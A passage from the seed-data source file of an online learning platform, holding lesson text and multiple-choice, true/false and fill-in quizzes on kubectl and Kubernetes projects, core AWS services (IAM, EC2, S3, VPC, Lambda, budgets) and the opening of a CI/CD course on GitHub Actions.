      `Everything so far has been YAML in the abstract. This lesson is the hands-on toolkit: \`kubectl\`, the command-line tool for talking to a cluster, and how to get a real (if small) cluster running on your own machine.\n\n## Getting a local cluster\n\nYou don't need a cloud account to learn Kubernetes. Tools like **minikube** and **kind** (Kubernetes IN Docker) run a real, small cluster locally:\n\n\`\`\`bash\n# minikube\nminikube start\n\n# or kind\nkind create cluster\n\`\`\`\n\nBoth give you a fully functional \`kubectl\` context pointed at a local cluster in a couple of minutes.\n\n## Core kubectl commands\n\n\`\`\`bash\nkubectl apply -f deployment.yaml   # create or update a resource from a YAML file\nkubectl get pods                    # list resources\nkubectl get pods -o wide            # list with extra detail (node, IP)\nkubectl describe pod web-7d9f8      # detailed info + recent events, great for debugging\nkubectl logs web-7d9f8              # see a container's stdout/stderr\nkubectl logs web-7d9f8 -f            # follow logs live\nkubectl exec -it web-7d9f8 -- sh    # get an interactive shell inside a running container\nkubectl delete -f deployment.yaml   # tear down what that file created\n\`\`\`\n\n\`kubectl describe\` is usually the first thing to reach for when something isn't working, its **Events** section at the bottom often tells you exactly why a Pod won't schedule or start (out of resources, image pull failure, failed health check, etc).\n\n## Namespaces: dividing a cluster\n\nA **namespace** is a way to partition a single cluster into logical groups, commonly one per environment or team:\n\n\`\`\`bash\nkubectl create namespace staging\nkubectl apply -f deployment.yaml -n staging\nkubectl get pods -n staging\nkubectl get pods --all-namespaces\n\`\`\`\n\nResource names only need to be unique **within** a namespace, so \`staging\` and \`production\` can each have their own \`web\` Deployment without colliding.\n\n> [!TIP]\n> \`kubectl apply\` is declarative and safe to re-run, if nothing changed in the YAML, re-applying it is a no-op. This is why CI/CD pipelines for Kubernetes almost always just run \`kubectl apply -f .\` on every deploy rather than tracking what's "new" vs "changed" themselves.`
    ),
    quiz: {
      title: 'kubectl Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which local tool lets you run a real Kubernetes cluster without a cloud account?',
          options: ['kubectl', 'minikube or kind', 'Docker Compose', 'AWS CLI'],
          answer: 'minikube or kind',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'kubectl ____ pod-name shows detailed info and recent events for a Pod, the best first stop when debugging.',
          options: [],
          answer: 'describe',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Resource names must be unique across the entire cluster, even across different namespaces.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command gets you an interactive shell inside a running container?',
          options: ['kubectl logs', 'kubectl describe', 'kubectl exec -it ... -- sh', 'kubectl get pods'],
          answer: 'kubectl exec -it ... -- sh',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Re-running kubectl apply -f on an unchanged YAML file is safe and effectively a no-op.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'kubectl create ____ staging creates a new logical partition of the cluster for grouping resources.',
          options: [],
          answer: 'namespace',
        },
      ],
    },
  },
  {
    title: 'Final Project: Deploy a Multi-Tier App to Kubernetes',
    content: lessonContent(
      'Final Project: Deploy a Multi-Tier App to Kubernetes',
      `Put every piece together: Deployments, Services, config, and real \`kubectl\` usage, applied to an actual multi-tier application.\n\n## Requirements\n\n1. Containerize a simple app with at least two tiers (e.g. a web/API service and a database, or a frontend and a backend), each with its own Dockerfile.\n2. Write a Deployment + Service for each tier, the backend/API's Service should be \`ClusterIP\` (internal only), the frontend's should be exposed (\`NodePort\` or \`LoadBalancer\`, depending on your cluster).\n3. Externalize at least one piece of configuration into a ConfigMap and one credential into a Secret, referenced by your Deployments rather than hardcoded.\n4. Deploy everything to a local cluster (minikube or kind) using \`kubectl apply -f\`, and confirm the frontend can actually reach the backend through its Service DNS name.\n5. Perform a rolling update, change something in your app, rebuild the image, bump the tag, and re-apply, then verify with \`kubectl rollout status\` that it completed without downtime.\n\n## Stretch goals\n\n- Add a liveness and readiness probe to at least one Deployment.\n- Use a PersistentVolumeClaim for the database tier's data directory so data survives a Pod restart.\n- Split your environment into two namespaces (e.g. \`staging\` and \`production\`) using the same YAML with different config.\n\nSubmit a link to your finished project (a repo with your YAML manifests, or a recording/write-up of it running) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const awsLessons: SeedLesson[] = [
  {
    title: 'Why AWS? Regions, Availability Zones, and IAM',
    content: lessonContent(
      'Why AWS? Regions, Availability Zones, and IAM',
      `**AWS (Amazon Web Services)** rents out compute, storage, networking, and dozens of higher-level services on demand, instead of buying and racking your own servers, you provision what you need in minutes and pay for what you use.\n\n## Regions and Availability Zones\n\nAWS infrastructure is organized geographically:\n\n| Concept | What it is |\n|---|---|\n| **Region** | A geographic area (e.g. \`us-east-1\`, \`eu-north-1\`), fully independent of other regions |\n| **Availability Zone (AZ)** | One or more physically separate data centers within a region |\n\nA region typically has 3+ AZs. Spreading resources across multiple AZs is the standard way to survive a single data center failure without any downtime, if one AZ has a power outage, your app keeps running in the others.\n\n## IAM: Identity and Access Management\n\n**IAM** controls *who* (or *what*) can do *what* in your AWS account. Getting this right is one of the most important skills in AWS, misconfigured IAM is behind a huge share of real-world cloud security incidents.\n\n- **Users**: an identity for a person, with long-lived credentials.\n- **Roles**: a set of permissions that something can *assume* temporarily, EC2 instances, Lambda functions, and even users from another AWS account can assume a role instead of using long-lived credentials.\n- **Policies**: JSON documents that actually define permissions, attached to users, roles, or groups.\n\n\`\`\`json\n{\n  "Version": "2012-10-17",\n  "Statement": [\n    {\n      "Effect": "Allow",\n      "Action": "s3:GetObject",\n      "Resource": "arn:aws:s3:::my-bucket/*"\n    }\n  ]\n}\n\`\`\`\n\nThis policy allows reading objects from one specific S3 bucket, nothing else. This is the **principle of least privilege**: grant exactly the permissions something needs, and nothing more.\n\n> [!WARNING]\n> Never use your AWS account's root user for everyday work, and never hardcode long-lived access keys into application code. Create an IAM user (or better, a role) with only the permissions a task actually needs.`
    ),
    quiz: {
      title: 'AWS Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is an Availability Zone?',
          options: [
            'A pricing tier',
            'One or more physically separate data centers within a region',
            'A type of IAM policy',
            'A backup region on another continent',
          ],
          answer: 'One or more physically separate data centers within a region',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does an IAM Role let you do that a long-lived IAM user credential doesn't?",
          options: [
            'Nothing, they are identical',
            'Be assumed temporarily by a service or another account without long-lived credentials',
            'Automatically create S3 buckets',
            'Bypass all billing',
          ],
          answer: 'Be assumed temporarily by a service or another account without long-lived credentials',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Spreading resources across multiple Availability Zones helps an app survive a single data center failure.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The principle of ____ privilege means granting exactly the permissions something needs, and nothing more.',
          options: [],
          answer: 'least',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "It's a recommended practice to use the AWS account's root user for everyday development work.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What actually defines the specific permissions granted to a user, role, or group?',
          options: ['A Region', 'An Availability Zone', 'A Policy', 'A VPC'],
          answer: 'A Policy',
        },
      ],
    },
  },
  {
    title: 'EC2: Virtual Servers in the Cloud',
    content: lessonContent(
      'EC2: Virtual Servers in the Cloud',
      `**EC2 (Elastic Compute Cloud)** rents virtual machines, called **instances**, by the second. It's the most fundamental AWS compute service, and the one most other services are conceptually built on top of.\n\n## Launching an instance\n\nEvery EC2 instance starts from an **AMI (Amazon Machine Image)**, a template that includes an operating system and optionally pre-installed software. AWS provides official AMIs (Amazon Linux, Ubuntu, Windows Server), and you can create your own from a configured instance to reuse later.\n\nKey choices when launching an instance:\n- **Instance type** (e.g. \`t3.micro\`, \`m5.large\`), determines vCPUs, memory, and network performance. The letter is the family (general purpose, compute-optimized, memory-optimized...), the number is the generation, the suffix is the size.\n- **Key pair**, an SSH key you use to log in, AWS never stores your private key.\n- **Security group**, a virtual firewall controlling what traffic can reach the instance.\n\n## Security groups\n\n\`\`\`\nInbound rules:\n  - Port 22 (SSH)  from 203.0.113.4/32   (your IP only)\n  - Port 443 (HTTPS) from 0.0.0.0/0       (anyone)\n\nOutbound rules:\n  - All traffic to 0.0.0.0/0\n\`\`\`\n\nSecurity groups are **stateful**: if you allow inbound traffic on a port, the matching response traffic is automatically allowed out, you don't need a separate outbound rule for replies. They're also **allow-only**, you can't write an explicit "deny" rule, only choose what to allow.\n\n## Elastic IPs\n\nA regular EC2 instance's public IP changes if you stop and start it. An **Elastic IP** is a static public IP you allocate to your account and attach to an instance, giving you a stable address that survives stop/start cycles (though it costs a small amount if it's allocated but not attached to a running instance, to discourage hoarding unused addresses).\n\n> [!TIP]\n> For anything long-running and public-facing, put a load balancer in front of your EC2 instances instead of relying on a single instance's Elastic IP, that way you can add/replace instances without ever changing the address your users hit.`
    ),
    quiz: {
      title: 'EC2 Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does an AMI provide when launching an EC2 instance?',
          options: ['A security group', 'A template including an OS and optionally pre-installed software', 'A billing alert', 'A VPC'],
          answer: 'A template including an OS and optionally pre-installed software',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Security groups require a separate outbound rule to allow response traffic for an allowed inbound connection.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A security group can only specify what traffic to ____, it has no explicit deny rules.',
          options: [],
          answer: 'allow',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What problem does an Elastic IP solve?',
          options: [
            "An instance's public IP normally changes on stop/start, an Elastic IP stays the same",
            'It encrypts network traffic',
            'It replaces the need for a security group',
            'It automatically scales instances',
          ],
          answer: "An instance's public IP normally changes on stop/start, an Elastic IP stays the same",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "You should rely on a single EC2 instance's Elastic IP for a long-running, public-facing service instead of using a load balancer.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The AWS SSH credential used to log into an instance is called a ____ pair.',
          options: [],
          answer: 'key',
        },
      ],
    },
  },
  {
    title: 'S3: Object Storage',
    content: lessonContent(
      'S3: Object Storage',
      `**S3 (Simple Storage Service)** stores files (called **objects**) inside **buckets**. It's not a filesystem or a database, it's built for storing and retrieving whole objects (images, backups, static files, logs) at massive scale and very high durability.\n\n## Buckets and objects\n\n\`\`\`bash\naws s3 mb s3://my-app-uploads\naws s3 cp photo.jpg s3://my-app-uploads/users/42/photo.jpg\naws s3 ls s3://my-app-uploads/users/42/\n\`\`\`\n\n- A **bucket** name must be globally unique across all of AWS, not just your account.\n- An **object key** (\`users/42/photo.jpg\`) looks like a file path, but S3 has no real folders, it's really just one flat namespace of keys that happens to use \`/\` as a visual separator in the console.\n\n## Storage classes\n\nNot all data needs to be equally fast to access. S3 offers multiple **storage classes** with different cost/retrieval-speed tradeoffs:\n\n| Class | Use case |\n|---|---|\n| Standard | Frequently accessed data |\n| Standard-IA (Infrequent Access) | Accessed rarely, but needs to be available instantly when it is |\n| Glacier | Long-term archives, retrieval takes minutes to hours, much cheaper storage |\n\nYou can set a **lifecycle rule** to automatically move objects to a cheaper class (or delete them) after a certain age, e.g. move logs to Glacier after 90 days.\n\n## Versioning and static website hosting\n\nEnabling **versioning** on a bucket keeps every version of an object instead of overwriting it, protecting against accidental deletes/overwrites (at the cost of storing every version).\n\nS3 can also serve static files directly as a website:\n\n\`\`\`bash\naws s3 website s3://my-site --index-document index.html --error-document 404.html\n\`\`\`\n\n## Bucket policies\n\nA **bucket policy** is a JSON document (using the same policy language as IAM) attached directly to a bucket, controlling who can access it:\n\n\`\`\`json\n{\n  "Version": "2012-10-17",\n  "Statement": [\n    {\n      "Effect": "Allow",\n      "Principal": "*",\n      "Action": "s3:GetObject",\n      "Resource": "arn:aws:s3:::my-site/*"\n    }\n  ]\n}\n\`\`\`\n\n> [!WARNING]\n> A bucket policy with \`"Principal": "*"\` and \`s3:GetObject\` makes every object in that bucket **publicly readable by anyone on the internet**, exactly what you want for a public website's assets, and exactly what you very much don't want for a bucket holding user data or backups. Misconfigured public buckets are one of the most common real-world AWS security incidents.`
    ),
    quiz: {
      title: 'S3 Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What must be globally unique across all of AWS, not just your account?',
          options: ['An object key', 'A bucket name', 'An IAM user', 'A security group'],
          answer: 'A bucket name',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'S3 has real, nested folders, similar to a traditional filesystem.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'An S3 ____ rule can automatically move objects to a cheaper storage class or delete them after a certain age.',
          options: [],
          answer: 'lifecycle',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which storage class is meant for long-term archives with retrieval taking minutes to hours?',
          options: ['Standard', 'Standard-IA', 'Glacier', 'ClusterIP'],
          answer: 'Glacier',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Enabling versioning on a bucket keeps every version of an object instead of overwriting it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a bucket policy with Principal: * and s3:GetObject do?',
          options: [
            'Deletes the bucket',
            'Makes every object in the bucket publicly readable by anyone',
            'Encrypts all objects',
            'Restricts access to your account only',
          ],
          answer: 'Makes every object in the bucket publicly readable by anyone',
        },
      ],
    },
  },
  {
    title: 'VPC: Networking Your Resources',
    content: lessonContent(
      'VPC: Networking Your Resources',
      `A **VPC (Virtual Private Cloud)** is your own private, isolated slice of the AWS network, where you control IP ranges, subnets, and routing for everything you launch inside it.\n\n## Subnets: public vs. private\n\nA VPC is divided into **subnets**, and each subnet is either:\n- **Public**: has a route to an **Internet Gateway**, so resources in it can be reached from (and reach) the public internet directly.\n- **Private**: has no direct route to the internet, used for things that should never be directly reachable, like a database.\n\n\`\`\`\nVPC: 10.0.0.0/16\n  Public subnet:  10.0.1.0/24   (web servers, load balancers)\n  Private subnet: 10.0.2.0/24   (databases, internal services)\n\`\`\`\n\nA common, secure pattern: put your load balancer and web servers in a public subnet, and your database in a private subnet that's only reachable from inside the VPC.\n\n## Route tables and the Internet Gateway\n\nA **route table** is a set of rules deciding where network traffic from a subnet gets sent. What makes a subnet "public" isn't a special setting, it's simply that its route table sends \`0.0.0.0/0\` (all other traffic) to an **Internet Gateway** attached to the VPC:\n\n\`\`\`\nDestination      Target\n10.0.0.0/16       local\n0.0.0.0/0         igw-0123456789\n\`\`\`\n\n## NAT Gateway: outbound internet for private subnets\n\nResources in a private subnet still often need **outbound** internet access (to download OS updates, call an external API), without being directly reachable from the internet. A **NAT Gateway**, placed in a public subnet, provides exactly that: private-subnet resources route outbound traffic through it, but nothing from the internet can initiate a connection back in.\n\n\`\`\`\nPrivate subnet route table:\nDestination      Target\n10.0.0.0/16       local\n0.0.0.0/0         nat-0123456789\n\`\`\`\n\n> [!NOTE]\n> This public-subnet/private-subnet/NAT-gateway pattern is extremely common, it's the default shape of almost every "real" production VPC: internet-facing things sit in public subnets, everything else sits in private subnets with outbound-only access through a NAT Gateway.`
    ),
    quiz: {
      title: 'VPC Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What makes a subnet 'public' in AWS?",
          options: [
            'Its name contains the word public',
            'Its route table sends internet-bound traffic to an Internet Gateway',
            'It has no security group',
            'It is the first subnet created',
          ],
          answer: 'Its route table sends internet-bound traffic to an Internet Gateway',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A database should typically be placed in a public subnet so it is easy to reach.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ Gateway lets resources in a private subnet make outbound internet connections without being directly reachable from the internet.',
          options: [],
          answer: 'NAT',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a route table?',
          options: [
            'A firewall rule list',
            "A set of rules deciding where a subnet's network traffic gets sent",
            'An IAM policy',
            'A DNS record',
          ],
          answer: "A set of rules deciding where a subnet's network traffic gets sent",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Traffic from the internet can freely initiate new connections into a private subnet through a NAT Gateway.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A VPC is your own private, isolated slice of the AWS ____, where you control IP ranges and routing.',
          options: [],
          answer: 'network',
        },
      ],
    },
  },
  {
    title: 'Serverless with Lambda and API Gateway',
    content: lessonContent(
      'Serverless with Lambda and API Gateway',
      `So far every service has meant managing a running server (EC2 instances, at minimum). **Lambda** flips that: you upload a function, and AWS runs it only when triggered, you never provision or manage a server at all.\n\n## Writing a Lambda function\n\n\`\`\`\nexports.handler = async (event) => {\n  const name = event.queryStringParameters?.name ?? 'world';\n  return {\n    statusCode: 200,\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ message: \`Hello, \${name}!\` }),\n  };\n};\n\`\`\`\n\nA Lambda function is just a handler function with a defined input (\`event\`) and output shape, AWS packages it, runs it in an isolated environment, and you're billed per invocation and per millisecond of execution time, nothing while it's idle.\n\n## Triggers\n\nLambda functions don't run on their own, something has to **invoke** them:\n\n| Trigger | Use case |\n|---|---|\n| API Gateway | Turn a function into an HTTP endpoint |\n| S3 event | Run a function whenever a file is uploaded to a bucket |\n| Scheduled (EventBridge) | Run a function on a cron-like schedule |\n| SQS queue | Process messages from a queue as they arrive |\n\n## API Gateway: HTTP in front of Lambda\n\n**API Gateway** is what turns a Lambda function into a real REST API with a public URL, handling routing, request validation, throttling, and API keys in front of your function.\n\n\`\`\`\nGET /hello  →  API Gateway  →  Lambda (handler above)  →  response\n\`\`\`\n\nYou define routes in API Gateway, each one maps to a Lambda function (or another backend), API Gateway handles the HTTP layer, your function just receives a plain JavaScript object describing the request.\n\n## Cold starts\n\nThe tradeoff for not managing servers: the **first** invocation after a period of inactivity has to initialize a fresh execution environment before running your code, called a **cold start**, adding noticeable latency (tens to hundreds of milliseconds, sometimes more for larger runtimes/dependencies). Subsequent invocations reuse a warm environment and are fast.\n\n> [!TIP]\n> If cold-start latency matters for your use case (a user-facing API with strict latency requirements), keep your function's dependencies small, and consider **provisioned concurrency**, which keeps a set number of execution environments pre-warmed at all times, for an additional cost.`
    ),
    quiz: {
      title: 'Lambda & API Gateway Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What do you pay for with AWS Lambda?',
          options: [
            'A fixed monthly fee regardless of usage',
            'Only invocations and execution time, nothing while idle',
            'Only the size of the deployed code',
            'A flat per-server cost like EC2',
          ],
          answer: 'Only invocations and execution time, nothing while idle',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does API Gateway do for a Lambda function?',
          options: [
            "Encrypts the function's code",
            'Turns it into a real HTTP endpoint with routing, throttling, and more',
            'Automatically writes the function for you',
            'Replaces the need for IAM',
          ],
          answer: 'Turns it into a real HTTP endpoint with routing, throttling, and more',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A Lambda function can only be triggered by API Gateway, no other AWS service.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The extra latency on the first invocation after inactivity, while a fresh execution environment initializes, is called a ____ start.',
          options: [],
          answer: 'cold',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Provisioned concurrency keeps a set number of execution environments pre-warmed to reduce cold starts, at an additional cost.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which trigger would you use to run a Lambda function whenever a file is uploaded to a bucket?',
          options: ['API Gateway', 'S3 event', 'SQS queue', 'EC2 instance'],
          answer: 'S3 event',
        },
      ],
    },
  },
  {
    title: 'IAM Roles, Billing, and the Well-Architected Basics',
    content: lessonContent(
      'IAM Roles, Billing, and the Well-Architected Basics',
      `Two last practical topics that matter on every real AWS project: giving your compute the right permissions without hardcoding credentials, and not getting an unpleasant billing surprise.\n\n## IAM roles for services, not just people\n\nThe single most important AWS security habit: an EC2 instance or Lambda function should be given an **IAM role**, not a hardcoded access key, to call other AWS services.\n\n\`\`\`\nLambda function → assumes an IAM Role → temporary credentials → calls S3, DynamoDB, etc.\n\`\`\`\n\nThe role is attached to the Lambda function (or EC2 instance) itself, AWS automatically provides temporary, auto-rotating credentials to your code, your application code never sees or stores a long-lived secret at all.\n\n\`\`\`\n{\n  "Effect": "Allow",\n  "Action": ["s3:GetObject", "s3:PutObject"],\n  "Resource": "arn:aws:s3:::my-app-uploads/*"\n}\n\`\`\`\n\nAttach this policy to the Lambda's execution role, and the function can read/write that one bucket, and nothing else, without a single access key in its code or environment variables.\n\n## Budgets and cost alerts\n\nAWS bills for exactly what you use, which is powerful but means an unexpected spike (a runaway loop calling an expensive API, a forgotten large instance) shows up on your bill, not before it happens. **AWS Budgets** lets you set a threshold and get alerted (or even trigger an action) before costs run away:\n\n\`\`\`\nBudget: $50/month\nAlert at: 80% ($40) and 100% ($50)\n\`\`\`\n\nSetting at least one budget alert on any real account, even a generous one, is a cheap insurance policy against a costly surprise.\n\n## The Well-Architected Framework, briefly\n\nAWS's **Well-Architected Framework** organizes best practices into six pillars:\n\n| Pillar | Cares about |\n|---|---|\n| Operational Excellence | Running and monitoring systems, learning from operations |\n| Security | Protecting data, systems, and assets |\n| Reliability | Recovering from failure, meeting demand |\n| Performance Efficiency | Using resources efficiently as demand changes |\n| Cost Optimization | Avoiding unnecessary spend |\n| Sustainability | Minimizing environmental impact |\n\nYou don't need to memorize the framework in depth this early, but recognizing the six pillars helps you understand *why* AWS documentation and architecture reviews keep bringing up the same handful of concerns.\n\n> [!NOTE]\n> Everything in this course so far, IAM roles over hardcoded keys, private subnets for databases, budgets, multi-AZ deployments, is really just the Security, Reliability, and Cost Optimization pillars in practice.`
    ),
    quiz: {
      title: 'IAM Roles & Billing Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What should an EC2 instance or Lambda function use to call other AWS services, instead of a hardcoded access key?',
          options: ['A public S3 bucket', 'An IAM role', 'A NAT Gateway', 'A security group'],
          answer: 'An IAM role',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Credentials provided to a service through an IAM role are temporary and auto-rotating.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'AWS ____ lets you set a spending threshold and get alerted before costs run away.',
          options: [],
          answer: 'Budgets',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How many pillars does the AWS Well-Architected Framework have?',
          options: ['3', '4', '5', '6'],
          answer: '6',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'AWS bills a fixed amount regardless of how many resources you actually use.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Protecting data, systems, and assets is the concern of the ____ pillar in the Well-Architected Framework.',
          options: [],
          answer: 'Security',
        },
      ],
    },
  },
  {
    title: 'Final Project: Deploy a Serverless API on AWS',
    content: lessonContent(
      'Final Project: Deploy a Serverless API on AWS',
      `Combine IAM, Lambda, API Gateway, and S3 into one real, working serverless API.\n\n## Requirements\n\n1. Write at least two Lambda functions (e.g. a \`GET /items\` and a \`POST /items\`) and expose them through API Gateway with real routes.\n2. Give each Lambda function's execution role only the specific permissions it needs (e.g. the write function gets \`s3:PutObject\`, the read function only gets \`s3:GetObject\`), not broad admin access.\n3. Store data in S3 (as JSON objects) or another AWS data store of your choice, read and written through your Lambda functions, not hardcoded.\n4. Set up at least one AWS Budget alert on the account you're using, even a small one, as practice for a real project.\n5. Document your architecture (which resources you created and how they connect) in a short README.\n\n## Stretch goals\n\n- Put your S3 bucket behind a bucket policy that blocks all public access, and confirm your Lambda functions can still read/write it via their IAM role.\n- Add a scheduled (EventBridge) Lambda function that runs on a timer, e.g. cleaning up old data.\n- Put your whole setup in a VPC with a private subnet, and give your Lambda functions VPC access to reach a resource that isn't publicly exposed.\n\nSubmit a link to your finished project (a repo, or a written architecture summary with screenshots of your working API) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const cicdLessons: SeedLesson[] = [
  {
    title: 'What is CI/CD? From Manual Deploys to Pipelines',
    content: lessonContent(
      'What is CI/CD? From Manual Deploys to Pipelines',
      `Before CI/CD, shipping code usually meant someone manually running tests, building the app, and copying files to a server, slow, error-prone, and something only whoever "knows the deploy steps" can safely do. **CI/CD** automates that entire path from commit to running in production.\n\n## Continuous Integration (CI)\n\n**CI** means every change gets automatically built and tested the moment it's pushed, catching integration problems (two people's changes conflicting, a change breaking existing behavior) within minutes instead of days.\n\n\`\`\`\nPush code → CI server checks it out → installs deps → runs tests → reports pass/fail\n\`\`\`\n\nThe core promise of CI: nobody merges code that doesn't pass the automated checks, so \`main\` stays in a known-good state.\n\n## Continuous Delivery vs. Continuous Deployment\n\nThese two terms are often confused, and the difference matters:\n\n| Term | What happens after CI passes |\n|---|---|\n| **Continuous Delivery** | A deployable build is produced and ready to ship, a human clicks a button to actually release it |\n| **Continuous Deployment** | Every change that passes CI is deployed to production automatically, no human in the loop |\n\nBoth require the same underlying automation (build, test, package), Continuous Deployment just removes the manual approval step entirely, appropriate once you trust your test suite and rollback process enough.\n\n## Why automate this at all\n\n- **Speed**: changes reach users in minutes/hours instead of a scheduled weekly release.\n- **Consistency**: the exact same automated steps run every time, no "it worked on my machine" deploy.\n- **Confidence**: a broken build is caught immediately, by CI, not discovered by a user in production.\n- **Auditability**: every deploy has a record of exactly what changed, what tests ran, and who approved it.\n\n> [!NOTE]\n> "Pipeline" is the general term for the sequence of automated steps (build → test → package → deploy), and it's the central concept the rest of this course builds on, concretely, with GitHub Actions.`
    ),
    quiz: {
      title: 'CI/CD Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the core promise of Continuous Integration?',
          options: [
            'Every deploy is manual',
            'Nobody merges code that fails automated checks, keeping main in a known-good state',
            'Tests are optional',
            'Deploys happen once a month',
          ],
          answer: 'Nobody merges code that fails automated checks, keeping main in a known-good state',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the key difference between Continuous Delivery and Continuous Deployment?',
          options: [
            'There is no difference',
            'Continuous Deployment removes the manual approval step before releasing to production',
            'Continuous Delivery does not run tests',
            'Continuous Deployment only works with Docker',
          ],
          answer: 'Continuous Deployment removes the manual approval step before releasing to production',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Continuous Delivery means every passing change is automatically deployed to production with no human approval.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The general term for the sequence of automated build/test/package/deploy steps is a ____.',
          options: [],
          answer: 'pipeline',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A key benefit of CI is that broken code is caught immediately by automation rather than discovered by a user in production.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these is NOT typically a benefit of automating CI/CD?',
          options: ['Speed', 'Consistency', 'Auditability', 'Eliminating the need for any tests'],
          answer: 'Eliminating the need for any tests',
        },
      ],
    },
  },
  {
    title: 'Building a Pipeline with GitHub Actions',
    content: lessonContent(
      'Building a Pipeline with GitHub Actions',
      `**GitHub Actions** is GitHub's built-in CI/CD system: workflows defined as YAML files living right in your repository, triggered automatically by events like a push or pull request.\n\n## Anatomy of a workflow\n\n\`\`\`yaml\n# .github/workflows/ci.yml\nname: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n      - run: npm ci\n      - run: npm test\n\`\`\`\n\n- \`on\` defines the **triggers**, here, every push to \`main\` and every pull request.\n- \`jobs\` is a set of independent units of work, each runs on a fresh **runner** (a temporary VM, \`ubuntu-latest\` here).\n- \`steps\` run in order within a job, each is either a shell command (\`run:\`) or a reusable **action** (\`uses:\`), a packaged, shareable step someone else already wrote.\n\n## Reusable actions\n\n\`actions/checkout@v4\` and \`actions/setup-node@v4\` are official actions maintained by GitHub, \`checkout\` clones your repo onto the runner (without it, the runner starts with an empty filesystem), \`setup-node\` installs a specific Node.js version. The GitHub Marketplace has thousands of community actions for almost anything (deploying to a cloud provider, sending a Slack notification, scanning for vulnerabilities).\n\n## Multiple jobs and dependencies\n\n\`\`\`yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps: [...]\n\n  deploy:\n    needs: test\n    runs-on: ubuntu-latest\n    steps: [...]\n\`\`\`\n\n\`needs: test\` makes the \`deploy\` job wait for \`test\` to succeed first, and skips \`deploy\` entirely if \`test\` fails. Jobs without a \`needs\` relationship run in **parallel** by default, useful for running lint, unit tests, and type-checking simultaneously to get feedback faster.\n\n> [!TIP]\n> Keep your CI fast. A pipeline people are used to waiting 15 minutes for gets ignored or worked around, one that takes 90 seconds gets checked every time, run independent jobs in parallel, and cache dependencies (next lesson) wherever you can.`
    ),
    quiz: {
      title: 'GitHub Actions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does the 'on' key in a GitHub Actions workflow define?",
          options: ['Which runner to use', 'The events that trigger the workflow', 'The programming language', 'The deployment target'],
          answer: 'The events that trigger the workflow',
        },
        {
